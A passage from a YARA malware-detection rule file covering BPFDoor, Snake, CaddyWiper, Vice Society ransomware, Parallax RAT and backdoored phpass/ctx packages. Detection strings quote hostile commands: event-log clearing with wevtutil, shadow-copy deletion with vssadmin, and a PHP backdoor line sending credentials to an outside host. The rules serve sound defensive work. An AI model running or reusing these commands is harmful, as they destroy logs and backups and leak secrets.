		uint16( 0 ) == 0x457f and filesize < 900KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or 4 of them or ( all of ( $sc* ) and $sc1 in ( @sc2 [ 1 ] -50 .. @sc2 [ 1 ] + 50 ) ) ) or ( 2 of ( $x* ) or 5 of them )
}
rule SIGNATURE_BASE_APT_MAL_LNX_Redmenshen_Bpfdoor_Controller_May22_1 : FILE
{
	meta:
		description = "Detects unknown Linux implants (uploads from KR and MO)"
		author = "Florian Roth (Nextron Systems)"
		id = "1438c3bf-3c42-59d5-9f3f-2d72bdaaac42"
		date = "2022-05-05"
		modified = "2023-12-05"
		reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_lnx_implant_may22.yar#L45-L76"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d"
		hash = "4c5cf8f977fc7c368a8e095700a44be36c8332462c0b1e41bff03238b2bf2a2d"
		hash = "599ae527f10ddb4625687748b7d3734ee51673b664f2e5d0346e64f85e185683"
		hash = "5b2a079690efb5f4e0944353dd883303ffd6bab4aad1f0c88b49a76ddcb28ee9"
		hash = "5faab159397964e630c4156f8852bcc6ee46df1cdd8be2a8d3f3d8e5980f3bb3"
		hash = "93f4262fce8c6b4f8e239c35a0679fbbbb722141b95a5f2af53a2bcafe4edd1c"
		hash = "97a546c7d08ad34dfab74c9c8a96986c54768c592a8dae521ddcf612a84fb8cc"
		hash = "c796fc66b655f6107eacbe78a37f0e8a2926f01fecebd9e68a66f0e261f91276"
		hash = "f8a5e735d6e79eb587954a371515a82a15883cf2eda9d7ddb8938b86e714ea27"
		hash = "fd1b20ee5bd429046d3c04e9c675c41e9095bea70e0329bd32d7edd17ebaf68a"
		logic_hash = "8de10beea4ef2e059b16d38fb015d6f091cc517b6f0c06b6ef6868518349994d"
		score = 90
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "[-] Connect failed." ascii fullword
		$s2 = "export MYSQL_HISTFILE=" ascii fullword
		$s3 = "udpcmd" ascii fullword
		$s4 = "getshell" ascii fullword
		$op1 = { e8 ?? ff ff ff 80 45 ee 01 0f b6 45 ee 3b 45 d4 7c 04 c6 45 ee 00 80 45 ff 01 80 7d ff 00 }
		$op2 = { 55 48 89 e5 48 83 ec 30 89 7d ec 48 89 75 e0 89 55 dc 83 7d dc 00 75 0? }
		$op3 = { e8 a? fe ff ff 0f b6 45 f6 48 03 45 e8 0f b6 10 0f b6 45 f7 48 03 45 e8 0f b6 00 8d 04 02 }
		$op4 = { c6 80 01 01 00 00 00 48 8b 45 c8 0f b6 90 01 01 00 00 48 8b 45 c8 88 90 00 01 00 00 c6 45 ef 00 0f b6 45 ef 88 45 ee }

	condition:
		uint16( 0 ) == 0x457f and filesize < 80KB and 2 of them or 5 of them
}
rule SIGNATURE_BASE_APT_MAL_LNX_Redmenshen_Bpfdoor_Controller_May22_2 : FILE
{
	meta:
		description = "Detects BPFDoor implants used by Chinese actor Red Menshen"
		author = "Florian Roth (Nextron Systems)"
		id = "d5c3d530-ed6f-563e-a3b0-55d4c82e4899"
		date = "2022-05-07"
		modified = "2023-12-05"
		reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_lnx_implant_may22.yar#L78-L100"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "76bf736b25d5c9aaf6a84edd4e615796fffc338a893b49c120c0b4941ce37925"
		hash = "96e906128095dead57fdc9ce8688bb889166b67c9a1b8fdb93d7cff7f3836bb9"
		hash = "c80bd1c4a796b4d3944a097e96f384c85687daeedcdcf05cc885c8c9b279b09c"
		hash = "f47de978da1dbfc5e0f195745e3368d3ceef034e964817c66ba01396a1953d72"
		logic_hash = "7525c675dbba6eb480f1d28fc6db05bd9907725c291e64ee6dc2453fd42892a0"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$opx1 = { 48 83 c0 0c 48 8b 95 e8 fe ff ff 48 83 c2 0c 8b 0a 8b 55 f0 01 ca 89 10 c9 }
		$opx2 = { 48 01 45 e0 83 45 f4 01 8b 45 f4 3b 45 dc 7c cd c7 45 f4 00 00 00 00 eb 2? 48 8b 05 ?? ?? 20 00 }
		$op1 = { 48 8d 14 c5 00 00 00 00 48 8b 45 d0 48 01 d0 48 8b 00 48 89 c7 e8 ?? ?? ff ff 48 83 c0 01 48 01 45 e0 }
		$op2 = { 89 c2 8b 85 fc fe ff ff 01 c2 8b 45 f4 01 d0 2d 7b cf 10 2b 89 45 f4 c1 4d f4 10 }
		$op3 = { e8 ?? d? ff ff 8b 45 f0 eb 12 8b 85 3c ff ff ff 89 c7 e8 ?? d? ff ff b8 ff ff ff ff c9 }

	condition:
		uint16( 0 ) == 0x457f and filesize < 100KB and 2 of ( $opx* ) or 4 of them
}
rule SIGNATURE_BASE_APT_MAL_LNX_Redmenshen_Bpfdoor_Controller_May22_3 : FILE
{
	meta:
		description = "Detects BPFDoor implants used by Chinese actor Red Menshen"
		author = "Florian Roth (Nextron Systems)"
		id = "91c2153a-a6e0-529e-852c-61f799838798"
		date = "2022-05-08"
		modified = "2023-12-05"
		reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_lnx_implant_may22.yar#L102-L119"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "144526d30ae747982079d5d340d1ff116a7963aba2e3ed589e7ebc297ba0c1b3"
		hash = "fa0defdabd9fd43fe2ef1ec33574ea1af1290bd3d763fdb2bed443f2bd996d73"
		logic_hash = "afec0bfeddf5c5c2abc1a3173f636c385437e5d7c0b68665f6274011113a6a9c"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "hald-addon-acpi: listening on acpi kernel interface /proc/acpi/event" ascii fullword
		$s2 = "/sbin/mingetty /dev" ascii fullword
		$s3 = "pickup -l -t fifo -u" ascii fullword

	condition:
		uint16( 0 ) == 0x457f and filesize < 200KB and 2 of them or all of them
}
rule SIGNATURE_BASE_APT_MAL_LNX_Redmenshen_Bpfdoor_Controller_Generic_May22_1 : FILE
{
	meta:
		description = "Detects BPFDoor malware"
		author = "Florian Roth (Nextron Systems)"
		id = "d30df2ae-7008-53c0-9a61-8346a9c9f465"
		date = "2022-05-09"
		modified = "2023-12-05"
		reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_lnx_implant_may22.yar#L121-L156"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d"
		hash = "1925e3cd8a1b0bba0d297830636cdb9ebf002698c8fa71e0063581204f4e8345"
		hash = "4c5cf8f977fc7c368a8e095700a44be36c8332462c0b1e41bff03238b2bf2a2d"
		hash = "591198c234416c6ccbcea6967963ca2ca0f17050be7eed1602198308d9127c78"
		hash = "599ae527f10ddb4625687748b7d3734ee51673b664f2e5d0346e64f85e185683"
		hash = "5b2a079690efb5f4e0944353dd883303ffd6bab4aad1f0c88b49a76ddcb28ee9"
		hash = "5faab159397964e630c4156f8852bcc6ee46df1cdd8be2a8d3f3d8e5980f3bb3"
		hash = "76bf736b25d5c9aaf6a84edd4e615796fffc338a893b49c120c0b4941ce37925"
		hash = "93f4262fce8c6b4f8e239c35a0679fbbbb722141b95a5f2af53a2bcafe4edd1c"
		hash = "96e906128095dead57fdc9ce8688bb889166b67c9a1b8fdb93d7cff7f3836bb9"
		hash = "97a546c7d08ad34dfab74c9c8a96986c54768c592a8dae521ddcf612a84fb8cc"
		hash = "c796fc66b655f6107eacbe78a37f0e8a2926f01fecebd9e68a66f0e261f91276"
		hash = "c80bd1c4a796b4d3944a097e96f384c85687daeedcdcf05cc885c8c9b279b09c"
		hash = "f47de978da1dbfc5e0f195745e3368d3ceef034e964817c66ba01396a1953d72"
		hash = "f8a5e735d6e79eb587954a371515a82a15883cf2eda9d7ddb8938b86e714ea27"
		hash = "fa0defdabd9fd43fe2ef1ec33574ea1af1290bd3d763fdb2bed443f2bd996d73"
		hash = "fd1b20ee5bd429046d3c04e9c675c41e9095bea70e0329bd32d7edd17ebaf68a"
		logic_hash = "57ae5f7dc1d202fe66d6626ef2bf2278b92bec0310449ce049bdaeaec5657c77"
		score = 90
		quality = 85
		tags = "FILE"

	strings:
		$op1 = { c6 80 01 01 00 00 00 48 8b 45 ?8 0f b6 90 01 01 00 00 48 8b 45 ?8 88 90 00 01 00 00 c6 45 ?? 00 0f b6 45 ?? 88 45 }
		$op2 = { 48 89 55 c8 48 8b 45 c8 48 89 45 ?? 48 8b 45 c8 0f b6 80 00 01 00 00 88 45 f? 48 8b 45 c8 0f b6 80 01 01 00 00 }
		$op3 = { 48 89 45 ?? 48 8b 45 c8 0f b6 80 00 01 00 00 88 45 f? 48 8b 45 c8 0f b6 80 01 01 00 00 88 45 f? c7 45 f8 00 00 00 00 }
		$op4 = { 48 89 7d d8 89 75 d4 48 89 55 c8 48 8b 45 c8 48 89 45 ?? 48 8b 45 c8 0f b6 80 00 01 00 00 88 45 f? }
		$op5 = { 48 8b 45 ?8 c6 80 01 01 00 00 00 48 8b 45 ?8 0f b6 90 01 01 00 00 48 8b 45 ?8 88 90 00 01 00 00 c6 45 ?? 00 0f b6 45 }
		$op6 = { 89 75 d4 48 89 55 c8 48 8b 45 c8 48 89 45 ?? 48 8b 45 c8 0f b6 80 00 01 00 00 88 45 f? 48 8b 45 c8 }

	condition:
		uint16( 0 ) == 0x457f and filesize < 200KB and 2 of them or 4 of them
}
rule SIGNATURE_BASE_MAL_BACKORDER_LOADER_WIN_Go_Jan23 : LOADER GOLANG BACKORDER MALWARE WINDOWS FILE
{
	meta:
		description = "Detects the BACKORDER loader compiled in GO which download and executes a second stage payload from a remote server."
		author = "Arda Buyukkaya (modified by Florian Roth)"
		id = "90a82f2c-be92-5d0b-b47e-f47db2b15867"
		date = "2025-01-23"
		modified = "2025-03-20"
		reference = "EclecticIQ"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_win_go_backorder_loader.yar#L1-L31"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "70c91ffdc866920a634b31bf4a070fb3c3f947fc9de22b783d6f47a097fec2d8"
		logic_hash = "9e79ec9e58e02b7660383ff20957b95bc3c61ed3badc9af3d5829ebe5bf6bd7b"
		score = 80
		quality = 85
		tags = "LOADER, GOLANG, BACKORDER, MALWARE, WINDOWS, FILE"

	strings:
		$GoBuildId = "Go build" ascii
		$x_DebugSymbol_1 = "C:/updatescheck/main.go"
		$x_DebugSymbol_2 = "C:/Users/IEUser/Desktop/Majestic/"
		$s_FunctionName_1 = "main.getUpdates.func"
		$s_FunctionName_2 = "main.obt_zip"
		$s_FunctionName_3 = "main.obtener_zip"
		$s_FunctionName_4 = "main.get_zip"
		$s_FunctionName_5 = "main.show_pr0gressbar"
		$s_FunctionName_6 = "main.pr0cess"

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 10MB and $GoBuildId and ( 1 of ( $x* ) or 3 of them )
}
rule SIGNATURE_BASE_APT_MAL_RU_WIN_Snake_Malware_May23_1 : MEMORY
{
	meta:
		description = "Hunting Russian Intelligence Snake Malware"
		author = "Matt Suiche (Magnet Forensics)"
		id = "53d2de3c-350c-5090-84bb-b6cde16a80ad"
		date = "2023-05-10"
		modified = "2025-03-21"
		reference = "https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_mal_ru_snake_may23.yar#L17-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "7cff7152259bb17a9b72b91f0fbef220aad2f35a1d2758d7225316a9896bf845"
		score = 70
		quality = 71
		tags = "MEMORY"
		threat_name = "Windows.Malware.Snake"
		scan_context = "memory"
		license = "MIT"

	strings:
		$a = { 25 73 23 31 }
		$b = { 25 73 23 32 }
		$c = { 25 73 23 33 }
		$d = { 25 73 23 34 }
		$e = { 2e 74 6d 70 }
		$g = { 2e 73 61 76 }
		$h = { 2e 75 70 64 }

	condition:
		all of them
}

rule SIGNATURE_BASE_SUSP_NVIDIA_LAPSUS_Leak_Compromised_Cert_Mar22_1 : FILE
{
	meta:
		description = "Detects a binary signed with the leaked NVIDIA certifcate and compiled after March 1st 2022"
		author = "Florian Roth (Nextron Systems)"
		id = "8bc7460f-a1c4-5157-8c2d-34d3a6c9c7e9"
		date = "2022-03-03"
		modified = "2022-03-04"
		reference = "https://twitter.com/cyb3rops/status/1499514240008437762"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_nvidia_leaked_cert.yar#L4-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e7e9e58ec1e3922471ad3ffd4ad9fbb3ac4b3c3841c35d1cd8886607f3cf1ab9"
		score = 70
		quality = 85
		tags = "FILE"

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 100MB and pe.timestamp > 1646092800 and for any i in ( 0 .. pe.number_of_signatures ) : ( pe.signatures [ i ] . issuer contains "VeriSign Class 3 Code Signing 2010 CA" and ( pe.signatures [ i ] . serial == "43:bb:43:7d:60:98:66:28:6d:d8:39:e1:d0:03:09:f5" or pe.signatures [ i ] . serial == "14:78:1b:c8:62:e8:dc:50:3a:55:93:46:f5:dc:c5:18" ) )
}
rule SIGNATURE_BASE_VULN_PUA_GIGABYTE_Driver_Jul22_1 : FILE
{
	meta:
		description = "Detects a vulnerable GIGABYTE driver sometimes used by malicious actors to escalate privileges"
		author = "Florian Roth (Nextron Systems)"
		id = "c66b858f-a034-53e1-b0fd-e48693fc6913"
		date = "2022-07-25"
		modified = "2023-12-05"
		reference = "https://twitter.com/malmoeb/status/1551449425842786306"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/vuln_gigabyte_driver.yar#L2-L28"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "31f4cfb4c71da44120752721103a16512444c13c2ac2d857a7e6f13cb679b427"
		logic_hash = "8aeae559b52b8e01ceab8caba24653b949b3bec694a14b36c819b0a7c9f8b7c6"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$xc1 = { 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73
               00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00 32
               00 2E 00 33 00 37 00 39 00 30 00 2E 00 31 00 38
               00 33 00 30 00 20 00 62 00 75 00 69 00 6C 00 74
               00 20 00 62 00 79 00 3A 00 20 00 57 00 69 00 6E
               00 44 00 44 00 4B 00 00 00 00 00 32 00 09 00 01
               00 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C
               00 4E 00 61 00 6D 00 65 00 00 00 67 00 64 00 72
               00 76 00 2E 00 73 00 79 00 73 }
		$x1 = "AEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAANQAuADIALgAzADcAOQAwAC4AMQA4ADMAMAAgAGIAdQBpAGwAdAAgAGIAeQA6ACAAVwBpAG4ARABEAEsAAAAAADIACQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAZwBkAHIAdgAuAHMAeQBz"
		$x2 = "BGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADUALgAyAC4AMwA3ADkAMAAuADEAOAAzADAAIABiAHUAaQBsAHQAIABiAHkAOgAgAFcAaQBuAEQARABLAAAAAAAyAAkAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAGcAZAByAHYALgBzAHkAc"
		$x3 = "ARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAA1AC4AMgAuADMANwA5ADAALgAxADgAMwAwACAAYgB1AGkAbAB0ACAAYgB5ADoAIABXAGkAbgBEAEQASwAAAAAAMgAJAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABnAGQAcgB2AC4AcwB5AH"

	condition:
		filesize < 4000KB and 1 of them
}
rule SIGNATURE_BASE_EXPL_CVE_2021_31166_Accept_Encoding_May21_1 : CVE_2021_31166
{
	meta:
		description = "Detects malformed Accept-Encoding header field as used in code exploiting CVE-2021-31166"
		author = "Florian Roth (Nextron Systems)"
		id = "d0a79cdc-f3ee-58f9-805c-ec9eb7993315"
		date = "2021-05-21"
		modified = "2023-12-05"
		reference = "https://github.com/0vercl0k/CVE-2021-31166"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/exploit_cve_2021_31166.yar#L2-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "5bb5b4093a7abe9d4297a4c047803b92f7c08f56f15b0f7bd163203ae47e026d"
		score = 70
		quality = 85
		tags = "CVE-2021-31166"

	strings:
		$xr1 = /[Aa]ccept\-[Ee]ncoding: [a-z\-]{1,16},([a-z\-\s]{1,16},|)*[\s]{1,20},/

	condition:
		1 of them
}
rule SIGNATURE_BASE_MAL_WIPER_Caddywiper_Mar22_1 : FILE
{
	meta:
		description = "Detects CaddyWiper malware"
		author = "Florian Roth (Nextron Systems)"
		id = "83495a0d-a295-5ec7-9761-ce79918e1034"
		date = "2022-03-15"
		modified = "2023-12-05"
		reference = "https://twitter.com/ESETresearch/status/1503436420886712321?s=20&t=xh8JK6fEmRIrnqO7Ih_PNg"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_ua_caddywiper.yar#L2-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "1e87e9b5ee7597bdce796490f3ee09211df48ba1d11f6e2f5b255f05cc0ba176"
		hash = "a294620543334a721a2ae8eaaf9680a0786f4b9a216d75b55cfd28f39e9430ea"
		hash = "ea6a416b320f32261da8dafcf2faf088924f99a3a84f7b43b964637ea87aef72"
		hash = "f1e8844dbfc812d39f369e7670545a29efef6764d673038b1c3edd11561d6902"
		logic_hash = "0d0278596010953e7068979c92a33dc0ace1bfa94979077412128d1ca756f834"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$op1 = { ff 55 94 8b 45 fc 50 ff 55 f8 8a 4d ba 88 4d ba 8a 55 ba 80 ea 01 }
		$op2 = { 89 45 f4 83 7d f4 00 74 04 eb 47 eb 45 6a 00 8d 95 1c ff ff ff 52 }
		$op3 = { 6a 20 6a 02 8d 4d b0 51 ff 95 68 ff ff ff 85 c0 75 0a e9 4e 02 00 00 }
		$op4 = { e9 67 01 00 00 83 7d f4 05 74 0a e9 5c 01 00 00 e9 57 01 00 00 8d 45 98 50 6a 20 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 50KB and 3 of them or all of them
}
rule SIGNATURE_BASE_APT_MAL_RANSOM_Vicesociety_Chily_Jan23_1 : FILE
{
	meta:
		description = "Detects Chily or SunnyDay malware used by Vice Society"
		author = "Florian Roth (Nextron Systems)"
		id = "1be4adb9-e60c-5023-9230-07f5fd16daaa"
		date = "2023-01-12"
		modified = "2023-12-05"
		reference = "https://www.sentinelone.com/labs/custom-branded-ransomware-the-vice-society-group-and-the-threat-of-outsourced-development/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_ransom_vicesociety_dec22.yar#L33-L63"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "4dabb914b8a29506e1eced1d0467c34107767f10fdefa08c40112b2e6fc32e41"
		logic_hash = "fc2967d86bf73033e68b8b9409a197ae8f7fcdf06e1e2a17e3d277d243caa541"
		score = 80
		quality = 83
		tags = "FILE"

	strings:
		$x1 = ".[Chily@Dr.Com]" ascii fullword
		$s1 = "localbitcoins.com/buy_bitcoins'>https://localbitcoins.com/buy_bitcoins</a>" ascii fullword
		$s2 = "C:\\Users\\root\\Desktop" ascii fullword
		$s3 = "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"" wide fullword
		$s4 = "cd %userprofile%\\documents\\" wide
		$s5 = "noise.bmp" wide fullword
		$s6 = " Execution time: %fms (1sec=1000ms)" ascii fullword
		$s7 = "/c vssadmin.exe Delete Shadows /All /Quiet" wide fullword
		$op1 = { 4c 89 c5 89 ce 89 0d f5 41 02 00 4c 89 cf 44 8d 04 49 0f af f2 89 15 e9 41 02 00 44 89 c0 }
		$op2 = { 48 8b 03 48 89 d9 ff 50 10 84 c0 0f 94 c0 01 c0 48 83 c4 20 5b }
		$op3 = { 31 c0 47 8d 2c 00 45 85 f6 4d 63 ed 0f 8e ec 00 00 00 0f 1f 80 00 00 00 00 0f b7 94 44 40 0c 00 00 83 c1 01 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them
}
rule SIGNATURE_BASE_Crime_Win32_Parallax_Loader_1 : FILE
{
	meta:
		description = "Detects Parallax Loader"
		author = "@VK_Intel"
		id = "5e030b68-3c29-5203-bb4e-f01850bfbbab"
		date = "2020-02-24"
		modified = "2023-12-05"
		reference = "https://twitter.com/VK_Intel/status/1227976106227224578"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_parallax_rat.yar#L2-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "829fce14ac8b9ad293076c16a1750502c6b303123c9bd0fb17c1772330577d65"
		logic_hash = "1331e7b69fd9b14b5d2dae45b452b385e48018290d91de33a4f4a5ebcce4805b"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$main_call = { 68 81 85 50 00 e8 ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 51 ff ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 68 00 10 00 00 68 b0 a2 00 00 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 68 8c e1 4f 00 ff ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 83 c4 0c 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? 8b ?? ?? ?? ?? ?? 03 ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 68 40 84 50 00 8d ?? ?? ?? ?? ?? 51 e8 ?? ?? ?? ?? 83 c4 0c}
		$decoder_call = { 55 8b ec 83 c4 f8 33 c0 89 ?? ?? 33 d2 89 ?? ?? 8b ?? ?? 3b ?? ?? 7d ?? 8b ?? ?? 8b ?? ?? 8b ?? ?? 8b ?? ?? 33 ?? ?? ?? ?? ?? ?? 8b ?? ?? 8b ?? ?? 89 ?? ?? 83 ?? ?? ?? 75 ?? 33 d2 89 ?? ?? eb ?? ff ?? ?? ff ?? ?? 8b ?? ?? 3b ?? ?? 7c ?? 59 59 5d c3}

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them
}
rule SIGNATURE_BASE_Crime_Win32_Parallax_Payload_1 : FILE
{
	meta:
		description = "Detects Parallax Injected Payload v1.01"
		author = "@VK_Intel"
		id = "f3a23a28-e322-59ff-85e0-72e44def5c02"
		date = "2020-02-24"
		modified = "2023-12-05"
		reference = "https://twitter.com/VK_Intel/status/1227976106227224578"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_parallax_rat.yar#L20-L38"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "20d0be64a0e0c2e96729143d41b334603f5d3af3838a458b0627af390ae33fbc"
		logic_hash = "3a1718d7caea5bd6741dd39fc16f955e1d3c73a282d51eda5b63c3352404529e"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$zwdelay_prologue = { 66 ?? ?? ?? 66 83 c1 01 66 ?? ?? ?? 50 b8 cb cb cb cb 89 ?? ?? ?? ?? ?? 58 8b ?? ?? ?? ?? ?? 89 ?? ?? 68 88 13 00 00 8b ?? ?? 8b ?? ?? 51 e8 ?? ?? ?? ??}
		$wininet_call = { b8 77 00 00 00 66 ?? ?? ?? b9 69 00 00 00 66 ?? ?? ?? ba 6e 00 00 00 66 ?? ?? ?? b8 69 00 00 00 66 ?? ?? ?? b9 6e 00 00 00 66 ?? ?? ?? ba 65 00 00 00 66 ?? ?? ?? b8 74 00 00 00 66 ?? ?? ?? 33 c9 66 ?? ?? ?? 8d ?? ?? 52 8b ?? ?? 8b ?? ?? ff d1 89 ?? ?? 6a 00 68 0c fc e5 f2 8b ?? ?? 52 e8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? 6a 00 68 3d a8 16 da 8b ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? 6a 00 68 e0 05 65 01 8b ?? ?? 51 e8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? 6a 00 68 f5 98 c0 6c 8b ?? ?? 52 e8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? 6a 00 68 24 1d 19 e5 8b ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? 6a 00 68 a8 ed f2 ce 8b ?? ?? 8b ?? ?? 52 e8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? 6a 00 6a 00 ff ?? ?? 85 c0 75 ?? 68 88 13 00 00 ff ?? ?? eb ?? 6a 00 68 00 01 00 04 6a }
		$rand_png_call = { b8 25 00 00 00 66 ?? ?? ?? ?? ?? ?? b9 78 00 00 00 66 ?? ?? ?? ?? ?? ?? ba 2e 00 00 00 66 ?? ?? ?? ?? ?? ?? b8 70 00 00 00 66 ?? ?? ?? ?? ?? ?? b9 6e 00 00 00 66 ?? ?? ?? ?? ?? ?? ba 67 00 00 00 66 ?? ?? ?? ?? ?? ?? 33 c0 66 ?? ?? ?? ?? ?? ?? 6a 64 6a 40 8b ?? ?? 8b ?? ?? ff d2 89 ?? ?? 8b ?? ?? 50 68 00 e1 f5 05 68 10 27 00 00 e8 ?? ?? ?? ??}

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 100KB and 2 of them
}
rule SIGNATURE_BASE_VULN_PHP_Hack_Backdoored_Phpass_May21 : FILE
{
	meta:
		description = "Detects backdoored PHP phpass version"
		author = "Christian Burkard"
		id = "da13924c-0448-589c-bb2a-ee09736a5602"
		date = "2022-05-24"
		modified = "2023-12-05"
		reference = "https://twitter.com/s0md3v/status/1529005758540808192"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/vul_backdoor_antitheftweb.yar#L2-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "d9669dadc698c6fa63d61857f9ada16a9303aa8bf4139bec75104f2e9f00a36a"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "file_get_contents(\"http://anti-theft-web.herokuapp.com/hacked/$access/$secret\")" ascii

	condition:
		filesize < 30KB and $x1
}
rule SIGNATURE_BASE_VULN_Python_Hack_Backdoored_Ctx_May21 : FILE
{
	meta:
		description = "Detects backdoored python ctx version"
		author = "Christian Burkard"
		id = "55c1326a-6a5f-5d6f-b798-2c8516faffe2"
		date = "2022-05-24"
		modified = "2023-12-05"
		reference = "https://twitter.com/s0md3v/status/1529005758540808192"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/vul_backdoor_antitheftweb.yar#L16-L31"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "4fdfd4e647c106cef2a3b2503473f9b68259cae45f89e5b6c9272d04a1dfaeb0"
